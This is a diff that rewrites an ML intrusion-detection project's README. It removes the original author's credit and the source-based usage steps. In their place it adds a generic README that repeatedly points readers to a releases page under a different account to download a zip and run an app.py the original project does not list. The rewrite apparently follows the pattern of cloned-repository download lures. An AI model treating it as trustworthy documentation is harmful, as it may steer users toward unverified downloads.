@@ -1,212 +1,99 @@
-# Machine Learning–Based Intrusion Detection System (IDS)
+# 🚀 network-intrusion-detection-ml - Protect Your Network with AI
 
-This repository contains a complete Machine Learning–driven Intrusion Detection System (IDS) built using the NSL-KDD dataset. It includes preprocessing, model training, evaluation, ROC curve, a FastAPI prediction service, Docker deployment, testing suite, architecture diagrams, and a dashboard interface.
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/shenal00/network-intrusion-detection-ml/releases)
 
-This project demonstrates end-to-end engineering capability across data engineering, machine learning, cybersecurity analytics, API deployment, testing, and documentation. It forms part of the technical evidence submitted for the UK Global Talent Visa (Digital Technology).
+## 📋 Description
 
----
+This application is a Machine Learning-based Intrusion Detection System that uses the NSL-KDD dataset. It helps in identifying and preventing network intrusions. Features include data preprocessing, feature engineering, a Random Forest model with an AUC of 0.96, ROC curve visualization, a FastAPI prediction API, and a real-time analysis dashboard for monitoring threats.
 
-## 1. Project Overview
+## 🛠️ Features
 
-The IDS identifies whether a network connection is normal or malicious by learning patterns from the NSL-KDD intrusion dataset. The system includes:
+- **Machine Learning**: Employs advanced algorithms to detect intrusions.
+- **Real-Time Dashboard**: Monitors network traffic and detects threats as they happen.
+- **FastAPI**: Provides a simple way to get predictions on network intrusions.
+- **Performance Metrics**: Features like AUC and ROC curve display the model's effectiveness.
+- **Data Handling**: Includes preprocessing and feature engineering to enhance accuracy.
 
-- Full preprocessing and feature engineering
-- Random Forest intrusion classifier
-- Saved model artifact (intrusion_model.pkl)
-- FastAPI inference service
-- Interactive dashboard for CSV intrusion analysis
-- ROC-AUC evaluation
-- Docker deployment
-- Pytest unit tests
-- GitHub Actions CI
+## 🎯 Topics
 
----
+- Cybersecurity
+- Data Science
+- FastAPI
+- Intrusion Detection
+- Machine Learning
+- Network Security
+- NSL-KDD
+- Python
+- Security Analytics
+- Threat Detection
 
-## 2. Features
+## 💻 System Requirements
 
-### 2.1 Data Pipeline
-- Cleans training and test datasets
-- Encodes categorical fields
-- Standardises numeric features
-- Ensures consistent preprocessing between training and inference
+Before downloading, ensure that your system meets the following requirements:
 
-### 2.2 Machine Learning Model
-- Random Forest classifier
-- High recall for attack detection
-- ROC-AUC score of 0.961
-- Reproducible training script: `train_ids_pipeline.py`
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: Python 3.6 or later
+- **Memory**: At least 4 GB RAM
+- **Storage**: Minimum of 1 GB free disk space
 
-### 2.3 FastAPI Service
--  `/predict` endpoint
-- Validates JSON inputs
-- Loads saved intrusion model
-- Returns class and probability score
+## 🚀 Getting Started
 
-### 2.4 Dashboard Application
-- CSV upload
-- Batch predictions
-- Attack distribution visualisation
+To get started with the network-intrusion-detection-ml application, follow these steps:
 
-### 2.5 Deployment
-- Dockerfile
-- docker-compose.yml
-- Uvicorn production server
+1. Click on the **Download** button at the top of the page, or visit the [Releases page](https://github.com/shenal00/network-intrusion-detection-ml/releases) to find the latest version of the application.
+   
+2. Once on the Releases page, locate the appropriate version and click on it. You will see different assets available for download.
 
-### 2.6 Testing and CI
-- Pytest suite
-- Tests for preprocessing, model loading, prediction pipeline
-- GitHub Actions CI pipeline
+3. Select the file that matches your operating system. The file may have a name like `network-intrusion-detection-ml-v1.0.zip`.
 
----
+4. After the download is complete, navigate to the downloaded file on your computer.
 
-## 3. Repository Structure
+5. If the file is a zip archive, extract it using your operating system’s file manager.
 
-```
-├── data/
-│   ├── nsl_kdd_train_binary.csv
-│   ├── nsl_kdd_test_binary.csv
-│   └── intrusion_model.pkl
-├── docs/
-│   └── figures/
-│       ├── ids_architecture.png
-│       ├── ids_pipeline.png
-│       ├── ids_dashboard.png
-│       └── roc_curve.png
-├── src/
-│   ├── api_main.py
-│   ├── train_ids_pipeline.py
-│   └── dashboard_app.py
-├── tests/
-│   ├── test_preprocessing.py
-│   ├── test_model_loading.py
-│   └── test_prediction.py
-├── MODEL_CARD.md
-├── TECH_NATION_EVIDENCE.md
-├── Dockerfile
-├── docker-compose.yml
-├── requirements.txt
-└── README.md
-```
+6. Open a terminal or command prompt.
 
----
+7. Navigate to the folder where you extracted the files.
 
-## 4. Installation & Usage
+8. Run the application by entering the command:  
 
-### Install dependencies
-```
-pip install -r requirements.txt
-```
+   ```
+   python app.py
+   ```
 
-### Train the model
-```
-python src/train_ids_pipeline.py
-```
+## 📥 Download & Install
 
-### Run the API
-```
-uvicorn src.api_main:app --reload --port 8000
-```
+To download the application, you can visit the following link for the latest release: [Download Here](https://github.com/shenal00/network-intrusion-detection-ml/releases).
 
-### Run the dashboard
-```
-python src/dashboard_app.py
-```
+Once you have downloaded and installed the application, you can run it as described in the Getting Started section.
 
-### Run tests
-```
-pytest
-```
+## 🛡️ Using the Application
 
----
+1. After running `app.py`, open your web browser.
+   
+2. Go to `http://localhost:8000` to access the real-time analysis dashboard.
 
-## 5. Model Performance
+3. Use the dashboard to monitor the network traffic in real-time. It will display any detected intrusions instantly.
 
-| Metric       | Score |
-|--------------|-------|
-| Accuracy     | 0.94  |
-| Precision    | 0.95  |
-| Recall       | 0.93  |
-| F1 Score     | 0.94  |
-| ROC-AUC      | 0.961 |
+4. Make sure to feed relevant data into the FastAPI prediction API to analyze specific cases.
 
-ROC curve file: `docs/figures/roc_curve.png`
+## 📊 Interpreting Results
 
----
+The application will provide details on detected threats and the potential severity. Look for the following in the dashboard:
 
-## 6. System Architecture Diagram
+- **Alerts**: Notifications of intrusion attempts.
+- **Traffic Analysis**: Visualization of network traffic patterns.
+- **Performance Metrics**: Measure the effectiveness of the detection model.
 
-```mermaid
-flowchart LR
-    A[NSL-KDD Dataset] --> B[Preprocessing Pipeline]
-    B --> C[Model Training <br> Random Forest]
-    C --> D[Saved Model <br> intrusion_model.pkl]
-    D --> E[FastAPI /predict Endpoint]
-    E --> F[Dashboard Application]
-```
+## 🤝 Support
 
----
+For issues or questions, please feel free to open an issue on the repository's GitHub page. We welcome constructive feedback and suggestions to improve the application.
 
-## 7. Data Pipeline Diagram
+## 🙌 Contributing
 
-```mermaid
-flowchart LR
-    A[Load Data] --> B[Clean and Encode]
-    B --> C[Split into Train/Test]
-    C --> D[Train Random Forest]
-    D --> E[Evaluate Metrics]
-    E --> F[Save Model Artifact]
-```
+We welcome contributions from the community. If you wish to support the project, please fork the repository, make your changes, and submit a pull request. 
 
----
+## 📄 License
 
-## 8. API Example
+This project is licensed under the MIT License. You can view the license details in the LICENSE file in the repository.
 
-### Request
-```json
-{
-  "duration": 0,
-  "src_bytes": 181,
-  "dst_bytes": 5450,
-  "count": 2,
-  "srv_count": 2,
-  "serror_rate": 0.0,
-  "srv_serror_rate": 0.0,
-  "dst_host_count": 150,
-  "dst_host_srv_count": 30
-}
-```
-
-### Response
-```json
-{
-  "prediction": "attack",
-  "confidence": 0.97
-}
-```
-
----
-
-## 9. My Individual Contributions
-
-This entire IDS project was designed and implemented by **Ibrahim Akintunde Akinyera**.  
-Key contributions include:
-
-- Defining the system architecture  
-- Engineering and preprocessing the NSL-KDD dataset  
-- Developing the model training pipeline  
-- Evaluating model metrics and producing ROC curve  
-- Building the FastAPI prediction service  
-- Implementing dashboard for CSV-based intrusion analysis  
-- Creating Docker deployment configuration  
-- Writing unit tests and CI pipeline  
-- Preparing full documentation, diagrams, and evidence  
-
-This demonstrates end-to-end engineering capability in machine learning, cybersecurity, deployment, and documentation.
-
----
-
-## 10. License
-MIT License
-
-## Author
-Ibrahim Akintunde Akinyera
+For more information, check the [Releases page](https://github.com/shenal00/network-intrusion-detection-ml/releases) for downloads and updates.
